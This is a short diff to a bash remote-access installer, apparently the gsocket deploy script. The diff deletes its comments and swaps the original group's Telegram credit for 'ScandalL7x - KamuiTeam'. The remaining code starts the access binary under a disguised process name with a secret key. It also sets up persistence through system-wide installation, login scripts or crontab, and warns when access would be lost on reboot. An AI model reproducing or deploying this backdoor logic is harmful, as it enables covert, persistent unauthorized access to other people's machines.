@@ -1633,12 +1633,6 @@ gs_start()
 	fi
 
 	if [[ -n "$IS_NEED_START" ]]; then
-		# We need an 'eval' here because the ENV_LINE[*] needs to be expanded
-		# and then executed.
-		# This wont work:
-		#     FOO="X=1" && ($FOO id)  # => -bash: X=1: command not found
-		# This does work:
-		#     FOO="X=1" && (eval $FOO id)
 		(cd "$HOME"; eval "${ENV_LINE[*]}"TERM=xterm-256color GS_ARGS=\"-s "$GS_SECRET" -liD\" exec -a \""$PROC_HIDDEN_NAME"\" \""$DSTBIN"\") || errexit
 		IS_GS_RUNNING=1
 	fi
@@ -1691,16 +1685,14 @@ if [[ -z $GS_NOINST ]]; then
 		echo -en "Installing remote access.............................................."
 		FAIL_OUT "${CDR}Set GS_DSTDIR= to a writeable & executable directory.${CN}"
 	else
-		# Try to install system wide. This may also start the service.
+
 		[[ $UID -eq 0 ]] && install_system
 
-		# Try to install to user's login script or crontab (if not installed as SYSTEMD)
 		[[ -z "$IS_INSTALLED" || -z "$IS_SYSTEMD" ]] && install_user
 	fi
 else
 	echo -e "GS_NOINST is set. Skipping installation."
 fi
-# -----END Install permanentally-----
 
 if [[ -z "$IS_INSTALLED" ]] || [[ -n $IS_DSTBIN_TMP ]]; then
 	echo -e >&2 "--> ${CR}Access will be lost after reboot.${CN}"
@@ -1719,6 +1711,6 @@ else
 	gs_start
 fi
 
-echo -e "--> ${CW}Join us on Telegram - https://t.me/thcorg${CN}"
+echo -e "--> ${CW}ScandalL7x - KamuiTeam${CN}"
 
 exit_code 0
